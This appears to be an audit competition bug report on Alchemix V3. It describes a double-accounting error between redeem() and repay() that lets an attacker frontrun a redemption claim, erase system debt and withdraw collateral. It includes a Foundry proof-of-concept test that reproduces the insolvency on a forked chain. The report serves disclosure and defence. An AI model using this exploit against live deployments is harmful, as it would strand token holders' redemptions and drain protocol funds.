# 56965 sc critical alchemistv3 handling of added transmuter coverage includes an error that enables an attacker to cause protocol insolvency

**Submitted on Oct 22nd 2025 at 09:10:50 UTC by @niroh for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56965
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

AlchemistV3::redeem() removes from debt/earmark any coverage added to the Transmuter since the last redeem, however this is already handled withing repay().

## Vulnerability Details

In AlchemistV3::redeem() the code attempts to remove from its debt/earmark any added coverage on the transmuter (capped by live Earmark), as can be seen here:

```solidity
//From AlchemistV3.sol redeem function

    // observed transmuter pre-balance -> potential cover
    uint256 transmuterBal = TokenUtils.safeBalanceOf(myt, address(transmuter));
    uint256 deltaYield    = transmuterBal > lastTransmuterTokenBalance ? transmuterBal - lastTransmuterTokenBalance : 0;
    uint256 coverDebt = convertYieldTokensToDebt(deltaYield);

    console.log("in redeem yield delta is %s",deltaYield);

    // cap cover so we never consume beyond remaining earmarked
    uint256 coverToApplyDebt = amount + coverDebt > liveEarmarked ? (liveEarmarked - amount) : coverDebt;

    uint256 redeemedDebtTotal = amount + coverToApplyDebt;
```

However, when coverage is added to the Transmuter (through the repay() function) debt and earmark are already removed from the total debt/earmark (and from the repaying CDP):

```solidity
//from AlchemistV3.sol repay()

   // Repay debt from earmarked amount of debt first
   uint256 earmarkToRemove = credit > account.earmarked ? account.earmarked : credit;
   account.earmarked -= earmarkToRemove; //AUDIT COMMENT: repayer earmark reduction accounted for here

   uint256 earmarkPaidGlobal = cumulativeEarmarked > earmarkToRemove ? earmarkToRemove : cumulativeEarmarked;
   cumulativeEarmarked -= earmarkPaidGlobal;  //AUDIT COMMENT: global earmark reduction accounted for here

   // Debt is subject to protocol fee similar to redemptions
   uint256 feeAmount = creditToYield * protocolFee / BPS;
   if (feeAmount > account.collateralBalance) {
       revert("Not enough collateral to pay for debt fee");
   } else {
       account.collateralBalance -= creditToYield * protocolFee / BPS;
   }

   _subDebt(recipientTokenId, credit); //AUDIT COMMENT: debt reduction handled here

```

While this scenario does not allways happen (due to certain conditions that must be met), an attacker can generate these conditions deliberately and cause this double accounting to reduce global debt/earmark (applied pro rata to all CDPs similar to redemptions) without a matching burn of synthetic tokens. The result is a general protocol insolvancy, where the circulating amount of synthetic tokens is not covered by collateral and can not be redeemed. The POC below demonstrates such a scenario.

### POC scenario walkthrough

1. Bob deposits 1500 myt to alchemist and mints 1000 alUSD
2. Bob transfers 501 alUSD to redeemer1 and 499 alUSD to redeemer 2
3. Both redeemers create redemptions with the amounts they got
4. warp time to when both redemtions are mature
5. bob sees a redeemer1 claimRedemption transaction in the mempool and frontruns it with repaying collateral worth 500 alUSD (this creates added coverage in the Transmuter, but not enough to cover the full redeemer1 redemption, which is key for this exploit). The collateral is added to Transmuter and the Alchemist debt/earmark is decreased by 500.
6. redeemer1 claimRedemption transaction is executed. Most of the 501 tokens claimed is taken from the Transmuter coverage, but 1 token needs to be redeemed from AlchemistV3 and so AlchemistV3 redeem is called.
7. AlchemistV3 redeem() redeems the 1 extra token, but also detects that coverage has increased by 500 and so tries to redeem 501 (capped to the available earmark which is 500 at that point)
8. As a result, the entire debt and earmark in the system is cleared. Since bob has the only CDP, he can remove his entire remaining collateral (inspite of the fact that 499 alUSD is still in circulation and is matured for redemption)
9. If redeemer 1 tries to claim their redemption now, the transaction will succeed but they will get 0 because there is no debt/earmark left in the system nor coverage on the transmuter.

## Impact Details

Protocol insolvancy through removing debt (and thus freeing collateral) that is required to cover the current issuance of synthetic tokens, leaving the protocol without ability to support redemptions not maintain the peg.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L601>

## Proof of Concept

## Proof of Concept

To run:

1. Copy the code below into the IntegrationTest contract is tes/IntergrationTest.t.sol
2. Run with FOUNDRY\_PROFILE=default forge test --fork-url <https://mainnet.gateway.tenderly.co> --match-test testDoubleAccountingPOC -vvv --evm-version cancun

```solidity
//start POC
    function depositToAlchemix(uint256 shares, address user) internal {
        vm.startPrank(user);
        IERC20(address(vault)).approve(address(alchemist),shares);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        alchemist.deposit(shares,user, tokenId);
        
        vm.stopPrank();
    }

     function MintOnAlchemix(uint256 toMint, address user) internal {
         vm.startPrank(user);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        assertGt(tokenId,0,"cannot mint to user with no positions");
        alchemist.mint(tokenId, toMint, user);
        vm.stopPrank();
    }

    function RedeemOnTransmuter(address user, uint256 debtAmount) internal {
        vm.startPrank(user);

        IERC20(alUSD).approve(address(transmuterLogic), debtAmount);
        transmuterLogic.createRedemption(debtAmount);

        vm.stopPrank();

    }

    function moveTime(uint256 blocks) internal {
        vm.warp(block.timestamp+blocks*12);
        vm.roll(block.number+blocks);
    }

    function repayOnAlchemist(address user, uint256 repaidDebtAmount) internal {
        vm.startPrank(user);
        uint256 yieldToRepay = alchemist.convertDebtTokensToYield(repaidDebtAmount);
         uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        IERC20(address(alchemist.myt())).approve(address(alchemist), yieldToRepay);
        alchemist.repay(yieldToRepay,tokenId);
        vm.stopPrank();
    }

    function printState(address user, string memory message) internal {
        //Total Debt:
        uint256 totalDebt = alchemist.totalDebt();
        uint256 synthIssued = alchemist.totalSyntheticsIssued();
        uint256 transmuterCollBalance = IERC20(address(alchemist.myt())).balanceOf(address(transmuterLogic));
        uint256 transmuterDebtCoverage = alchemist.convertYieldTokensToDebt(transmuterCollBalance);
        uint256 transmuterLocked = transmuterLogic.totalLocked();
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        (uint256 collateral, uint256 debt, uint256 earmarked) = alchemist.getCDP(tokenId);
        console.log("%s",message);
        console.log("Total Debt: %s",totalDebt/1e18);
        console.log("transmuter Debt Coverage: %s",transmuterDebtCoverage/1e18);
        console.log("transmuter Locked Synthetic: %s",transmuterLocked/1e18);
        console.log("Total Issuance: %s",synthIssued/1e18);
        console.log("CDP collateral: %s, debt %s, earmarked %s\n\n", collateral/1e18,  debt/1e18,  earmarked/1e18);
    }

    function ClaimResdemptionTransmuter(address user) internal {
        vm.startPrank(user);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(transmuterLogic));
        transmuterLogic.claimRedemption(tokenId);
        vm.stopPrank();

    }

    function withdrawFromAlchemist(address user, uint256 amount) internal {
        vm.startPrank(user);
         uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        alchemist.withdraw(amount,user, tokenId);
        vm.stopPrank();
    }


    function testDoubleAccountingPOC() public {
        //init users
        address bob = makeAddr("bob");
        address redeemer1 = makeAddr("redeemer1");
        address redeemer2 = makeAddr("redeemer2");

        //bob deposit 3000 underlying to vault 
        uint256 sharesBob = _magicDepositToVault(address(vault), bob, 3_000e6);

         //bob deposits 1500 vault shares to alchemix
        depositToAlchemix(1500e18, bob);

        //bob mints 1000 alUSD
        MintOnAlchemix(1000e18,bob);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(bob, address(alchemistNFT));

        //transfer some slUSD to redeemers
        vm.startPrank(bob);
        IERC20(alUSD).transfer(redeemer1, 501*1e18 );
        IERC20(alUSD).transfer(redeemer2, 499*1e18 );
        vm.stopPrank();

        //create redemptions
        RedeemOnTransmuter(redeemer1, 501*1e18);
        RedeemOnTransmuter(redeemer2, 499*1e18);

        //warp time to end of vesting
        moveTime(transmuterLogic.timeToTransmute());

        //1. bob repays 500 synthetic (transmuter coll increases)
        repayOnAlchemist(bob, 500e18);
        printState(bob,"state after repay");

        //2. redemption Claimed
        ClaimResdemptionTransmuter(redeemer1);

        //3. update and print system state
        moveTime(1);
        alchemist.poke(tokenId);
        printState(bob, "state after claim redemption");

        //4. bob now has zero debt and can withdraw his entire remaining collateral
         uint256 balanceBefore = IERC20(address(alchemist.myt())).balanceOf(bob);
        (uint256 collateral,,) = alchemist.getCDP(tokenId);
        withdrawFromAlchemist(bob, collateral);
         uint256 balanceAfter = IERC20(address(alchemist.myt())).balanceOf(bob);
         console.log("bob got %s", (balanceAfter-balanceBefore));

        //5. second redeemer can not redeem now because there is 0 collateral in the system
         balanceBefore = IERC20(address(alchemist.myt())).balanceOf(redeemer2);
        ClaimResdemptionTransmuter(redeemer2);
         balanceAfter = IERC20(address(alchemist.myt())).balanceOf(redeemer2);
        console.log("redeemer2 got %s", (balanceAfter-balanceBefore));

    }

    //endPOC
```
